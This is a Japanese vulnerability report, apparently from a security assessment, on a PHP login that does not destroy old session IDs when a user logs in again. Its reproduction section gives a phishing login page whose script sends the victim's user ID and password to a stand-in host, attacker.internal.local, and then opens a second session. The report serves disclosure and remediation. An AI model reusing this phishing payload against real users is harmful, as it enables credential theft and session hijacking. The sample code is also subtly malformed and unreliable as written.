## サーバにおいて多重ログインの際にセッションIDを破棄しないことによる多重ログインと不正操作の脆弱性
### 対象
ログイン画面

### 危険度
Middle
* 中間者攻撃やなりすまし攻撃によるセッションハイジャックで容易になりすますことができ、そのユーザの任意の処理を実行できるため

### 解説
今回のプログラムでは、ログイン時に`session.php`を用いてPHPのセッション機能を利用しセッション管理を行なっている。
しかし、現在の実装ではログインする上で当該ユーザが再ログインした場合に、
それ以前に利用していたセッション情報を破棄せずに新規のセッションを作成するため、
以前のセッション情報でもアクセスができる状態になる。
これにより、なりすましページを作成してログインさせる・MITMを実行しログインさせる等でセッションIDを複数作成することにより、
当該ユーザのセッションIDを攻撃者が保持し攻撃に利用することができる


### 再現方法
以下のようななりすましページを作成する
```html
<html>
<body>
<form name="login">
    UID: <input type="input" name="uid"><br>
    PASS: <input type="password" name="pass"><br>
    <button type="button" onclick="javascript:send()">OK</button>
</form>
<script>
    send = _ => {
        {uid, pass} = {
            uid: document.forms[0].uid.value,
            pass: document.forms[0].pass.value
        };

        fetch("https://mbsd.internal.local/index.php", {
            method: 'POST',
            body: {
                mode: 'login',
                JSON: JSON.stringify({
                    loginid: uid,
                    password: pass
                })
            }
        }).then( (res) => {
            fetch("http://attacker.internal.local/fishing.do", {
                    body: {
                        uid,
                        pass
                    }
                }
            ).then( _ => console.log("FIRE!!!"));

            fetch("https://mbsd.internal.local/index.php", {
                method: 'POST',
                body: {
                    mode: 'login',
                    JSON: JSON.stringify({
                        loginid: uid,
                        password: pass
                    })
                }
            }).then( (res) => {
                // 本来の処理
            })
        })
    }
</script>
</body>
</html>
```

このように、ログイン時にセッションIDを複数作成し、片方を攻撃者が保持することにより、
利用者がログアウトしても有効なセッションが作成できる。

### 条件
* 中間者攻撃ができる事 または なりすましを行うために標的の個人情報を知っている事

### 想定される被害・影響
* 当該ユーザの情報の改ざん
* なりすましによる不正送金

### 対策
* データベースにセッション情報を保存する等して多重ログインができないようにする